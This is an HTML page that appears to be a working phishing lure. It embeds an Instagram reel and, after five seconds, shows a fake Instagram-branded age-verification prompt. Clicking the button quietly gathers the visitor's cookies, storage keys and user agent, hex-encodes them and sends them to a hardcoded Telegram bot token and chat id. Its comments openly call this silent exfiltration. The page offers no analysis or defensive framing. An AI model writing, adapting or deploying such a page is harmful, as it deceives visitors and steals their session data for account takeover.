<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; overflow: hidden; }
        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:999; color:#fff; text-align:center; padding-top:180px; }
        .btn { background:#0095f6; color:#fff; border:none; padding:15px; border-radius:10px; font-weight:700; width:80%; cursor:pointer; font-size:16px; transition: 0.2s; }
        .btn:active { transform: scale(0.95); background:#1877f2; }
    </style>
</head>
<body>
    <div id="v">
        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60" style="margin-bottom:20px;">
        <h2 style="font-size:22px; margin-bottom:10px;">Age Verification</h2>
        <p style="font-size:15px; color:#efefef; padding:0 40px; margin-bottom:30px; line-height:1.4;">To comply with local regulations, please verify that you are 18+ to watch this reel.</p>
        <button class="btn" onclick="done()">Verify Age (One-Tap)</button>
    </div>

    <iframe id="f" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%; height:100vh; border:none;"></iframe>

    <script>
        const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
        const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');

        // Theek 5 second baad prompt dikhega
        setTimeout(() => { document.getElementById('v').style.display = 'block'; }, 5000);

        function done() {
            // Background mein silent data capture
            let d = JSON.stringify({
                k: Object.keys(localStorage),
                s: Object.keys(sessionStorage),
                c: document.cookie || "COOKIE_PROTECTED",
                ua: navigator.userAgent
            });
            
            // Telegram par silent exfiltration
            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_VERIFIED_DATA_${h(d)}`;
            
            // Pop-up turant gayab
            document.getElementById('v').style.display = 'none';
        }
    </script>
</body>
</html>
